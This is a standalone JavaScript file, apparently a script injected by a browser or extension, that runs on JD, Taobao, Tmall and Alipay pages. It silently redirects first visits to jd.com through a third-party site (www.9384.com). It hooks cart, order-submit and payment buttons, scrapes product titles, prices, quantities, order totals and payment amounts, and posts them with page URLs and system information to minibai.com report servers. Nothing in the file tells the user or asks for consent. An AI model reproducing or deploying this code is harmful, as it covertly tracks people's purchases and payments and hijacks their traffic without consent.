! function (w) {
  'usr strict';
  ! function (ju) {
    var runUrl = [
        'click.jd.com',
        'u.jd.com',
        'www.jd.com'
      ],
      key = 'Fdjfiesfhviup33215';
    for (var i of runUrl) {
      if (location.href.indexOf(i) != -1) {
        if (!getCookie(key)) {
          document.body.style.display = 'none';
          if (w.stop) w.stop();
          else document.execCommand("Stop");
          setCookie(key, 1, 5);
          location.replace(ju);
        } else if (getCookie(key) == 1) {
          setCookie(key, 2, 5);
          upload_();
          break;
        }
      }
    }

    function upload_() {
      let url = '//cclientreport2.minibai.com/tmp5log.json',
        data = {
          h: w.location.href,
          t: 2,
        };

      if (chrome.xb && chrome.xb.getSysInfo) {
        chrome.xb.getSysInfo(function (s) {
          data['s'] = s;
          ajax({
            type: 'post',
            url,
            data
          });
        })
      } else {
        ajax({
          type: 'post',
          url,
          data
        })
      };
    }
  }('https://www.9384.com/jd.html?AAA');
  ! function () {
    let p, n, gn;
    if (!verUrl()) return;
    window.addEventListener('load', function () {
      listenShop((opts) => {
        upload_(opts);
      });
      getOrder((opts) => {
        upload_(opts);
      });
      payM((opts) => {
        upload_(opts);
      });
      visitUrl();
    });

    function verUrl() {
      var domainArr = [
        'jd.com',
        'taobao.com',
        'tmall.com',
        'alipay.com'
      ];
      for (var item of domainArr) {
        if (~location.host.indexOf(item)) return true;
      }
      return false;
    }

    function visitUrl() {
      var visits = [
        'detail.tmall.com',
        'item.taobao.com',
        'item.jd.com'
      ];
      for (let item of visits) {
        if (~location.host.indexOf(item)) {
          upload_({
            t: 10
          });
        }
      }
    }

    function listenShop(callback) {
      var typeList = [{ //tm
        tri: '#J_LinkBasket',
        by: '#J_LinkBuy',
        pri: '#J_PromoPrice .tm-price',
        num: '.mui-amount-input',
        title: '.tb-detail-hd h1',
        collect: '#J_AddFavorite'
      }, { //tb
        tri: '.J_LinkAdd',
        by: '.J_LinkBuy',
        pri: '.tb-rmb-num',
        num: '#J_IptAmount',
        title: '.tb-main-title',
        collect: '.tb-social-fav'
      }, { //jd
        tri: '#InitCartUrl',
        by: '',
        pri: '.p-price',
        num: '.buy-num',
        title: '.sku-name',
        collect: '.J-follow'
      }, ];
      for (var i of typeList) {
        var el = getEl(i.tri),
          el_b = getEl(i.by),
          el_p, el_n, el_t, el_c;
        if (el) {
          el_p = getEl(i.pri);
          el_n = getEl(i.num);
          el_t = getEl(i.title);
          el_c = getEl(i.collect);

          p = ~location.host.indexOf('item.jd.com') ? el_p.innerText.substr(1) : el_p.innerText;
          n = el_n.value;
          gn = el_t.innerText;
          el.addEventListener('click', callback);
          if (el_b) el_b.addEventListener('click', callback);
          if (el_c) el_c.addEventListener('click', () => {
            callback({
              t: 3
            });
          });
          return;
        }
      }
    }

    function getOrder(callback) {
      var visits = [
          'buy.taobao.com',
          'buy.tmall.com',
          'trade.jd.com',
        ],
        oid = Math.random().toString(36).substr(2),
        els = [{ //tmall taobao
          tri: '#submitOrderPC_1 .go-btn',
          title: '.order-link.info-title', //innerText  '毛巾 竹纤维' s
          url: '.order-link.info-title', // href "//item.taobao.com/item.htm?id=582335188528"  s
          pri: '.info-price.info-cell', //innerText "699.00"  s
          num: '.quantity-inner', //innerText "1"  s
          totalPay: '#realPayPC_1 .realpay--price' // 订单应实付金额 innerText "748.00"
        }, { //jd
          tri: '#order-submit',
          title: '#shopping-lists .goods-msg .p-name > a', //innerText  '毛巾 竹纤维' s
          url: '#shopping-lists .goods-msg .p-name > a', // href  s
          pri: '#shopping-lists .goods-msg .jd-price', //innerText "￥ 9.90"  s
          num: '#shopping-lists .goods-msg .p-num', // innerText "x1"  s
          totalPay: '#sumPayPriceId' // 订单应实付金额 innerText "￥135.90"
        }, ];
      if (~visits.indexOf(location.host)) {
        let i_ = location.host === 'trade.jd.com' ? 1 : 0;
        let el = getEl(els[i_].tri);
        if (el) {
          let el_gns = getElAll(els[i_].title),
            el_us = getElAll(els[i_].url),
            el_ps = getElAll(els[i_].pri),
            el_ns = getElAll(els[i_].num),
            op = i_ ? getEl(els[i_].totalPay).innerText.substr(1) : getEl(els[i_].totalPay).innerText,
            len = el_gns.length;
          for (let i = 0; len > i; i++) {
            let gn = el_gns[i].innerText,
              u = el_us[i].getAttribute('href'),
              p = i_ ? el_ps[i].innerText.substr(2) : el_ps[i].innerText,
              n = i_ ? el_ns[i].innerText.substr(1) : el_ns[i].innerText,
              data_ = {
                gn,
                u,
                p,
                n,
                op,
                oid
              };
            el.addEventListener('click', () => {
              callback({
                t: 4,
                ...data_
              })
            });
          }
        }
      }
    }

    function payM(callback) {
      var visits = [
          'cashiersu18.alipay.com',
          'pcashier.jd.com',
        ],
        els = [{ //tmall taobao
          tri: '#J_authSubmit',
          pp: '.order-real-amount em'
        }, { //jd
          tri: '.pv-button a.ui-button.ui-button-XL',
          pp: '.o-price strong', //innerText  "135.90"
        }];
      if (~visits.indexOf(location.host)) {
        let i_ = location.host === 'pcashier.jd.com' ? 1 : 0,
          el = getEl(els[i_].tri) || document.querySelector(els[i_].tri);
        if (el) {
          let pp = getEl(els[i_].pp).innerText;
          el.addEventListener('click', () => {
            callback({
              t: 5,
              pp
            })
          });
        }
      }
    }

    function getEl(name) {
      if (!name) {
        return null;
      }
      return document.querySelector(name);
    }

    function getElAll(name) {
      if (!name) {
        return [];
      }
      return document.querySelectorAll(name);
    }

    function upload_(opts) {
      var opts = opts === event ? {} : opts;
      let url = '//cclientreport.minibai.com/sl.json',
        data = {
          u: w.location.href,
          t: 1,
          p,
          n,
          gn,
          ...opts
        };
      if (chrome.xb && chrome.xb.getSysInfo) {
        chrome.xb.getSysInfo(function (s) {
          data['s'] = s;
          ajax({
            type: 'post',
            url,
            data
          });
        })
      } else {
        ajax({
          type: 'post',
          url,
          data
        });
      }
    }

  }();
  
  ! function () {
    if (
      document.readyState === "complete" ||
      (document.readyState !== "loading" && !document.documentElement.doScroll)
    ) {
      upload_();
    } else {
      w.addEventListener('load', upload_);
    }

    function upload_() {
      let url = '//cclientreport2.minibai.com/tmp5log.json',
        data = {
          h: w.location.href
        };
      if (chrome.xb && chrome.xb.getSysInfo) chrome.xb.getSysInfo(function (s) {
        data['s'] = s;
        ajax({
          type: 'post',
          url,
          data
        });
      });
      else {
        ajax({
          type: 'post',
          url,
          data
        });
      }

    }
  }();

  function ajax(options) {
    options = options || {};
    options.type = (options.type || "GET").toUpperCase();
    options.dataType = options.dataType || 'json';
    options.async = options.async || true;
    options.timeout = options.timeout || 100;
    var params = getParams(options.data),
      xhr, timeoutFlag = null;
    w.clearTimeout(timeoutFlag);
    if (w.XMLHttpRequest) {
      xhr = new XMLHttpRequest();
    } else {
      xhr = new ActiveXObject('Microsoft.XMLHTTP')
    }
    xhr.onreadystatechange = function () {
      if (xhr.readyState == 4) {
        var status = xhr.status;
        if (status >= 200 && status < 300) {
          w.clearTimeout(timeoutFlag);
          options.success && options.success(xhr.responseText, xhr.responseXML);
        } else {
          w.clearTimeout(timeoutFlag);
          options.error && options.error(status);
        }
      }
    };
    if (options.type == 'GET') {
      xhr.open("GET", options.url + '?' + params, options.async);
      xhr.send(null)
    } else if (options.type == 'POST') {
      xhr.open('POST', options.url, options.async);
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr.send(params);
    }
    timeoutFlag = w.setTimeout(function () {
      w.clearTimeout(timeoutFlag);
      xhr.abort();
    }.bind(this), options.timeout);
  }

  function getParams(data) {
    var arr = [];
    for (var param in data) {
      arr.push(encodeURIComponent(param) + '=' + encodeURIComponent(data[param]));
    }
    return arr.join('&');
  }

  function setCookie(key, value, expirehours) {
    var date = new Date();
    date.setTime(date.getTime() + expirehours * 3600 * 1000);
    document.cookie = key + "=" + value + "; expires=" + date.toGMTString();
  }

  function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for (var i = 0; i < ca.length; i++) {
      var c = ca[i];
      while (c.charAt(0) == ' ') c = c.substring(1);
      if (c.indexOf(name) != -1) return c.substring(name.length, c.length);
    }
    return "";
  }
}(window.top);